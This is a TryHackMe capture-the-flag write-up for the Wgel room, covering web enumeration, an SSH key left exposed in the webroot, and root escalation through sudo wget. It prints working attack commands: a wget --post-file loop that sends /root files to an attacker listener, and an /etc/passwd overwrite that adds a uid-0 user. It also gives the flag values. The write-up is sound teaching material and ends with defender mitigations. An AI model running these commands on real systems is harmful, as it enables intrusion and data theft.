# Wgel CTF — TryHackMe Writeup

> **Box:** Wgel CTF
> **Platform:** TryHackMe
> **Difficulty:** Easy
> **Skills:** Web enumeration, exposed SSH key, GTFOBins (sudo wget abuse)
> **Date:** May 2026

---

## Summary

A web server hosting a static site under a non-default `/sitemap/` directory leaks an SSH private key from an exposed `.ssh/` folder. The username is hidden in an HTML comment on the default Apache page. After SSH access, `sudo -l` reveals `wget` allowed via passwordless sudo — leading to root flag exfiltration via GTFOBins's `--post-file` technique.

| | |
|---|---|
| **Initial vector** | Directory listing → exposed `id_rsa` in webroot |
| **Foothold** | SSH as `jessie` using leaked private key |
| **Privesc** | `sudo wget` (NOPASSWD) → file read via `--post-file` |
| **User flag** | `057c67131c3d5e42dd5cd3075b198ff6` |
| **Root flag** | `b1b968b37519ad1daa6408188649263d` |

---

## 1. Reconnaissance

### 1.1 Nmap

```bash
nmap -sV -sC -p- -T4 10.65.188.174
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
```

Two services exposed: SSH (Ubuntu 16.04) and Apache serving the default "It works" page. The default page itself is suspicious — operators usually replace it. Worth reading carefully later.

### 1.2 Gobuster — root

```bash
gobuster dir -u http://10.65.188.174:80 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```

```
/sitemap              (Status: 301)  -->  /sitemap/
/server-status        (Status: 403)
```

`/sitemap/` is not standard for an Apache install — that's our entry point.

### 1.3 Gobuster — `/sitemap/`

```bash
gobuster dir -u http://10.65.188.174/sitemap/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```

```
/index.html, /about.html, /blog.html, /services.html, /shop.html,
/work.html, /contact.html
/css/, /js/, /fonts/, /images/, /sass/
```

This is a Colorlib **Unapp** template. No obvious hints in the page bodies — but template sites often hide things in dotfiles that wordlists skip.

### 1.4 Hidden files — the key finding

```bash
gobuster dir -u http://10.65.188.174/sitemap/ \
  -w /usr/share/wordlists/dirb/common.txt -t 50
```

```
/.htaccess            (Status: 403)
/.htpasswd            (Status: 403)
/.ssh                 (Status: 301)  -->  /sitemap/.ssh/   ← !
/.DS_Store            (Status: 200)
```

Two interesting hits:
- **`.ssh/`** returns 301 (redirect to listing), not 403 (forbidden). The directory exists and is browsable.
- **`.DS_Store`** — macOS metadata file, sometimes leaks filenames.

---

## 2. Initial Access

### 2.1 Grabbing the SSH key

```bash
curl -s http://10.65.188.174/sitemap/.ssh/id_rsa -o /tmp/id_rsa
chmod 600 /tmp/id_rsa
ssh-keygen -y -f /tmp/id_rsa
```

```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDaa6N4G/cwRAUJ6XzK+OAPPTrr7wbPRbvY...
```

Valid RSA private key. But there's no comment field in the PEM, so no embedded username.

### 2.2 Username discovery — HTML comment on the Apache default page

This was the part I missed on the first pass. The default Apache page on `/` (not `/sitemap/`) had a custom comment injected into the HTML:

```bash
curl -s http://10.65.188.174/ | grep -oE "<!--[^>]*-->"
```

```html
<!-- Jessie don't forget to udate the webiste -->
```

**Lesson:** when grepping HTML for usernames, don't filter by keywords like `user|admin|hint` — extract **all** comments and read them. The hint here was a name with a capital letter, which would be missed by case-sensitive keyword filters.

### 2.3 SSH login

```bash
ssh -i /tmp/id_rsa jessie@10.65.188.174
```

```
jessie@CorpOne:~$ id
uid=1000(jessie) gid=1000(jessie) groups=1000(jessie),4(adm),24(cdrom),
27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
```

`jessie` is in the `sudo` group — already a strong signal for privesc. Also notable:
- `.bash_history -> /dev/null` (someone covering tracks)
- `.sudo_as_admin_successful` (jessie has used sudo before)

### 2.4 User flag

```bash
find / -name "user*.txt" 2>/dev/null
# → /home/jessie/Documents/user_flag.txt

cat /home/jessie/Documents/user_flag.txt
```

```
057c67131c3d5e42dd5cd3075b198ff6
```

---

## 3. Privilege Escalation

### 3.1 sudo -l

```
jessie@CorpOne:~$ sudo -l
User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```

Two paths visible:

1. `(ALL : ALL) ALL` — full sudo, but requires jessie's password (we logged in via key, no password known).
2. `(root) NOPASSWD: /usr/bin/wget` — passwordless sudo on wget. **This is the intended path** and matches the room name "Wgel" → wget abuse.

### 3.2 Why `sudo wget` is dangerous

`wget` has three abusable features when run as root ([GTFOBins](https://gtfobins.github.io/gtfobins/wget/#sudo)):

| Feature | Effect when run as root |
|---|---|
| `--post-file=PATH` | Reads any file (incl. root-only) and POSTs it to attacker |
| `-O PATH` | Writes downloaded content to any path (overwrites `/etc/passwd`, `/etc/sudoers`, cron files) |
| `--use-askpass=SCRIPT` | Executes arbitrary script |

The cleanest exploit is `--post-file` for read-only exfiltration — minimal blast radius, no risk of breaking the system.

### 3.3 Exfiltrating the root flag

**Attacker box — start a netcat listener:**

```bash
nc -lvnp 9001
```

**Target (jessie) — POST root flag content to the listener:**

```bash
# Brute over common flag filenames since /root is unreadable to jessie
for name in flag.txt root.txt root_flag.txt rootflag.txt proof.txt; do
  echo "=== $name ==="
  sudo /usr/bin/wget --post-file=/root/$name http://10.65.75.22:9001 2>&1 \
    | grep -E "missing|saved|HTTP"
done
```

```
=== flag.txt ===
BODY data file '/root/flag.txt' missing: No such file or directory
=== root.txt ===
BODY data file '/root/root.txt' missing: No such file or directory
=== root_flag.txt ===
[connection successful — data POSTed]
```

**Listener captures the flag in the HTTP body:**

```
Connection received on 10.65.188.174 56780
POST / HTTP/1.1
User-Agent: Wget/1.17.1 (linux-gnu)
Host: 10.65.75.22:9001
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

b1b968b37519ad1daa6408188649263d
```

**Root flag:** `b1b968b37519ad1daa6408188649263d`

### 3.4 Alternative: full root shell via /etc/passwd overwrite

For a full root shell instead of just file reads, the same `wget` permission can be used with `-O` to overwrite `/etc/passwd`:

**Attacker:**

```bash
# Generate a password hash
openssl passwd -1 -salt xyz pwn123
# $1$xyz$N2Lcr5FeCNo2BLQiy9ar9.

# Pull current /etc/passwd via SSH (we have key access)
scp -i /tmp/id_rsa jessie@10.65.188.174:/etc/passwd /tmp/passwd

# Append a new root-equivalent user
echo 'pwn:$1$xyz$N2Lcr5FeCNo2BLQiy9ar9.:0:0:root:/root:/bin/bash' >> /tmp/passwd

# Serve over HTTP
cd /tmp && python3 -m http.server 8000
```

**Target:**

```bash
sudo /usr/bin/wget http://10.65.75.22:8000/passwd -O /etc/passwd
su pwn          # password: pwn123
id              # → uid=0(root)
cat /root/root_flag.txt
```

⚠️ **In real engagements, never overwrite `/etc/passwd` without a backup and validation.** A malformed passwd file locks out all login. The `--post-file` read approach is always the safer first choice.

---

## 4. Lessons Learned

### 4.1 Always read all HTML comments

I almost missed `Jessie` because my grep was filtering by keywords (`user|admin|hint`) instead of just dumping all comments. The right pass is:

```bash
curl -s "$URL" | grep -oE "<!--[^>]*-->"
```

— and read them with eyes. CTF authors and lazy devs both leave hints there.

### 4.2 The default Apache page is not always default

When the operator hasn't replaced the default `index.html` of `/`, it doesn't mean it's untouched. Check it carefully — operators sometimes inject hints/notes/comments into the default page. Same applies to `phpinfo.php`, `info.php`, server-status pages, etc.

### 4.3 Hidden file enumeration is non-negotiable

The default `directory-list-2.3-medium` from dirbuster does **not** test dotfiles. Always run a second pass with a wordlist that includes `.ssh`, `.git`, `.env`, `.htaccess`, `.bash_history`, `.DS_Store` — `dirb/common.txt` works, or `seclists/Discovery/Web-Content/raft-*-files.txt`.

### 4.4 GTFOBins muscle memory

For any `sudo -l` finding, the first reflex should be: open GTFOBins, search the binary, look at the **Sudo** section. Common abusable sudo binaries to memorize:

`find`, `vim`, `less`, `more`, `man`, `awk`, `python`, `perl`, `tar`, `cp`, `tee`, `dd`, `tcpdump`, `wget`, `curl`, `nano`, `vi`, `git`, `nmap`, `apt-get`, `systemctl`.

### 4.5 File-read primitive ≠ shell

Sometimes you only need a file (flag, ssh key, shadow). Don't always escalate to a full shell — read primitives are quieter and lower-risk. `sudo wget --post-file=` is a beautiful example: no persistence, no overwrite, no chance to brick the box.

---

## 5. References

- [GTFOBins — wget](https://gtfobins.github.io/gtfobins/wget/)
- [TryHackMe — Wgel CTF](https://tryhackme.com/room/wgelctf)
- [Colorlib Unapp template (the static site used)](https://colorlib.com/wp/template/unapp/)

---

## 6. Mitigations (defender perspective)

For anyone running a real production server, the failures here are:

1. **Sensitive directory in webroot.** `~/.ssh/` should never be inside `/var/www`. Apache should explicitly deny access to dotfiles via `<FilesMatch "^\.">` or a global rule denying `.ht*`, `.ssh`, `.git`, `.env`.
2. **Default Apache page in production.** Replace it. The "It works" page leaks the OS distribution and Apache version, and operators sometimes leave debug notes in it.
3. **NOPASSWD sudo on wget/curl/python.** These are file-read and file-write primitives. If a user needs to fetch updates via sudo, restrict to specific URLs/destinations using a wrapper script, not the raw binary.
4. **Private SSH keys on web servers.** Never. If a server needs to authenticate outbound, use a deployment-only key with `command=` restrictions in `authorized_keys` on the target, or a secrets manager (Vault, AWS SSM).
